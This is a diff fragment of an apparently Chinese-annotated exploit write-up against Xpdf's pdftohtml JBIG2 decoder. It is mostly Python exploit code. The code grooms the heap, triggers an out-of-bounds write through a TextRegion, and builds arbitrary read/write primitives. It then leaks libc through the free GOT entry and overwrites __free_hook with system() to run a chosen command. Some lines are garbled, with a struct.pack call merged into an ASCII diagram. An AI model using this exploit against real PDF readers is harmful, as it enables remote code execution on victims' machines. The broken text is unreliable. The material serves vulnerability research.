  PageInfo(101, w=8 * (GLIST_DATA_SIZE // 4), h=1),
 ]
-```
-
-
-
-```
 // low address --------------------------------------------
-/* 
- 一些其他的堆块分配，包括 
+/*
+ 一些其他的堆块分配，包括
  1. size=8 的 global GList backing store
  2. DummyAlloc
  3. SymbolDict0、1、2
@@ -1718,24 +1605,19 @@ SymbolDict3-8;
 
 // 注意这里！
 pageBitmap backing buffer // size=16 的 global GList backing store 堆空洞
- 
+
 SymbolDict9-16;
 
 size=32 的 global GList backing store 堆空洞
- 
+
 SymbolDict17-32;
 
 size=64 的 global GList backing store; // 最终的 GList data 堆位置，这里可不是堆空洞
 
 // 注意这里！
-pageBitmap JBIG2Bitmap; 结构体 
- 
+pageBitmap JBIG2Bitmap; 结构体
+
 // high address -------------------------------------------
-```
-
-
-
-```
 // sanity check: if the w/h/x/y values are way out of range, it likely
 // indicates a damaged JBIG2 stream
 if (w / 10 > pageW || h / 10 > pageH ||
@@ -1745,12 +1627,8 @@ if (w / 10 > pageW || h / 10 > pageH ||
  done = gTrue;
  return;
 }
-```
-
-
-
-```
-void JBIG2Stream::readPageInfoSeg(Guint length)
+void JBIG2Stream::
+readPageInfoSeg(Guint length)
 {
  Guint xRes, yRes, flags, striping;
  // 从不受信任的流中直接读入 pageW 和 pageH
@@ -1769,11 +1647,6 @@ void JBIG2Stream::readPageInfoSeg(Guint length)
  }
  [...]
 }
-```
-
-
-
-```
 page0 = [
  # Make sure page bitmap buffer uses the second-last globalSegments data buffer so
  # that it lies just before syms, at a fixed offset.
@@ -1784,11 +1657,6 @@ page0 = [
  # we want.
  PageInfo(101, w=1919114514, h=1919114514),
 ]
-```
-
-
-
-```
 # Trigger the out-of-bound write.
 TextRegion(
  102,
@@ -1797,20 +1665,15 @@ TextRegion(
  x=0,
  y=0,
  # size_to_overflow // 8 个指针
- ref_segs=[1] 
+ ref_segs=[1]
  # 0x10000 + (syms_size - size_to_overflow) // 8 个指针
  + [2] * (0x10000 + (syms_size - size_to_overflow) // 8)
  # 共 0xffff0000 个指针
- + [0] * 0xFFFF, 
+ + [0] * 0xFFFF,
 ),
-```
-
-
-
-```
 // low address --------------------------------------------
-/* 
- 一些其他的堆块分配，包括 
+/*
+ 一些其他的堆块分配，包括
  1. size=8 的 global GList backing store
  2. DummyAlloc
  3. SymbolDict0、1、2
@@ -1825,13 +1688,8 @@ syms // syms 的 size 为 syms_size
 SymbolDict17-32; // 16 个 SymbolDict 的 size，一个 SymbolDict 的 size 为 0x40 字节
 size=64 的 global GList backing store; // 此时的 Glist size 为 GLIST_DATA_SIZE
 pageBitmap JBIG2Bitmap 结构体 // 这里还需要覆写 vtble + segNum + w + h + line，共24字节
- 
+
 // high address -------------------------------------------
-```
-
-
-
-```
 size_to_overflow = (
  ptmalloc_chunk_size(syms_size)
  # 40: sizeof(JBIG2SymbolDict); there are (glist_capacity // 2) irrelevant JBIG2SymbolDict-s
@@ -1843,18 +1701,8 @@ size_to_overflow = (
  # segNum(4), w(4), h(4), line(4)
  + 4 * 4
 )
-```
-
-
-
-```
 # Take back the free-d syms, hold it to prevent potential crash.
 GenericRegion(103, imm=False, bitmap=Bitmap(8, syms_size)),
-```
-
-
-
-```
 page_bitmap_buf_to_class_offset = (
  ptmalloc_chunk_size(GLIST_DATA_SIZE // 4)
  + ptmalloc_chunk_size(40) * (glist_capacity // 4)
@@ -1862,11 +1710,6 @@ page_bitmap_buf_to_class_offset = (
  - 4 * 4
  - 8
 )
-```
-
-
-
-```
 # Overwrite pageBitmap->w, h and line
 GenericRegion(
  104,
@@ -1874,15 +1717,7 @@ GenericRegion(
  y=0,
  comb_op=CombOp.Replace,
  # (x, y) -> mem[(y << 24) | (x >> 3)] >> (7 - (x & 7)), max 48-bit addressing
- bitmap=Bitmap(struct.pack("<III", 2 ** 27, 2 ** 24, 2 ** 24)),
- imm=True,
-),
-```
-
-
-
-```
-+------------------> w=2^27 bit
+ bitmap=Bitmap(struct.pack(" w=2^27 bit
 |
 |
 |
@@ -1890,20 +1725,10 @@ GenericRegion(
 |
 |
 V h=2^24 bit
-```
-
-
-
-```
 # 16 "variables". Since we can only do bitwise operations relative to page bitmap
 # with Refinement regions, we need these variables for peeking other absolute
 # addresses, and also rebase the page bitmap in one segment command.
 SymbolDict(105, [Bitmap(64, 1)] * 16)
-```
-
-
-
-```
 class BitSeg:
  _seq = itertools.count(10000)
 
@@ -1929,18 +1754,13 @@ class CombOp(enum.IntEnum):
  Xor = 2
  Xnor = 3
  Replace = 4
- 
+
 def bitop(oa, ob, op: CombOp):
  b = BitSeg.from_page(ob)
  x, y = oa % 2 ** 27, oa // 2 ** 27
  page0.append(
  ReadoutRefinement(65536, x=x, y=y, imm=True, ref=b.consume(), comb_op=op)
  )
-```
-
-
-
-```
 bitwise_mov = lambda a, b: bitop(a, b, CombOp.Replace)
 bitwise_xor = lambda a, b: bitop(a, b, CombOp.Xor)
 bitwise_and = lambda a, b: bitop(a, b, CombOp.And)
@@ -1955,11 +1775,6 @@ mov_q_q = lambda a, b: op_q_q(a, b, CombOp.Replace)
 xor_q_q = lambda a, b: op_q_q(a, b, CombOp.Xor)
 and_q_q = lambda a, b: op_q_q(a, b, CombOp.And)
 or_q_q = lambda a, b: op_q_q(a, b, CombOp.Or)
-```
-
-
-
-```
 # Don't worry, Libra won't hu^W^W^W Xpdf allocates 1 more byte
 adder_buf_offset = GLIST_DATA_SIZE // 4 * 8 # 1024
 
@@ -1989,11 +1804,6 @@ def add_q_q(oa, ob):
  # 设置进位标志
  bitwise_mov(carry, ab_and)
  bitwise_or(carry, ab_xor_c_and)
-```
-
-
-
-```
 def op_q_imm(offset, imm, op):
  offset *= 8
  x, y = offset % 2 ** 27, offset // 2 ** 27
@@ -2007,21 +1817,11 @@ mov_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.Replace)
 xor_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.Xor)
 and_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.And)
 or_q_imm = lambda o, imm: op_q_imm(o, imm, CombOp.Or)
-```
-
-
-
-```
 def rebase_variable_q(idx, addr_page_offset):
  mov_q_q(
  variable_bitmap_offset + idx * ptmalloc_chunk_size(0x20) + 0x18,
  addr_page_offset,
  )
-```
-
-
-
-```
 def load_variable(to_page_offset, idx):
  to_page_offset *= 8
  x, y = to_page_offset % 2 ** 27, to_page_offset // 2 ** 27
@@ -2038,11 +1838,6 @@ def load_variable(to_page_offset, idx):
  ref_segs=[105],
  )
  )
-```
-
-
-
-```
 // low address .....
 ...
 SymbolDict3-8;
@@ -2050,44 +1845,19 @@ pageBitmap backing buffer // size=16 的 global GList backing store 堆空洞
 SymbolDict9-16;
 ...
 // high address .....
-```
-
-
-
-```
 # vtbl of a JBIG2SymbolDict adajacent to page bitmap buffer
 # 取出vtbl地址放到+0处
 mov_q_q(0, ptmalloc_chunk_size(GLIST_DATA_SIZE // 4))
-```
-
-
-
-```
 # 计算出-vtbl_offset + free_got_offset
 mov_q_imm(
  8, (-PDFTOHTML_VTBL_JBIG2SYMBOLDICT_OFFSET + PDFTOHTML_FREE_GOT_OFFSET) % 2 ** 64
 )
-```
-
-
-
-```
 # 计算vtbl地址+(-vtbl_offset + free_got_offset)得到free_got的地址，放到+0处
 add_q_q(0, 8)
-```
-
-
-
-```
 # 从+0处取出free_got的地址，放到第0个"变量"data 指针处
 rebase_variable_q(0, 0)
 # 取出存放在第0个"变量"里的值（此时该值为 libc.free 的绝对地址），放到+8处
 load_variable(8, 0) # address of libc.free at +8
-```
-
-
-
-```
 # 把LIBC_FREE_OFFSET这个立即数的值放到+0处
 mov_q_imm(0, -LIBC_FREE_OFFSET % 2 ** 64)
 # 计算free_got的地址+(-libc_free_offset)，得到libc基地址，放到+8处
@@ -2102,28 +1872,13 @@ add_q_q(0, 16)
 mov_q_imm(16, LIBC_SYSTEM_OFFSET)
 # 计算出system的绝对地址，放到+8处
 add_q_q(8, 16)
-```
-
-
-
-```
 +0: free_hook_address +8: libc_system_address
-```
-
-
-
-```
 # 取出pagebitmap的data指针，放到+24处
 mov_q_q(24, page_bitmap_buf_to_data_ptr)
 # 把立即数8放到+16处
 mov_q_imm(16, 8)
 # 将data指针加上8，并将结果放到+24处
 add_q_q(24, 16)
-```
-
-
-
-```
 # 取出pagebitmap的data指针的值放到第0个变量的 data 字段
 rebase_variable_q(0, page_bitmap_buf_to_data_ptr)
 # 取出data指针+8的值，放到第1个变量的 data 字段
@@ -2133,20 +1888,11 @@ load_variable(page_bitmap_buf_to_data_ptr, 0)
 # 取出第1个变量的值（也就是 libc_system_address），放到+0处，也就是 free_hook 基地址上的那个指针值
 # 这样就完成了改写 free hook 的操作
 load_variable(0, 1)
-```
-
-
-
-```
 page0.append(
  GenericRegion(233, x=64, y=0, comb_op=CombOp.And, bitmap=Bitmap(COMMAND_TO_RUN))
 )
-```
-
-
-
-```
-void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,
+void JBIG2Stream::
+readGenericRegionSeg(Guint segNum, GBool imm,
  GBool lossless, Guint length)
 {
  [...];
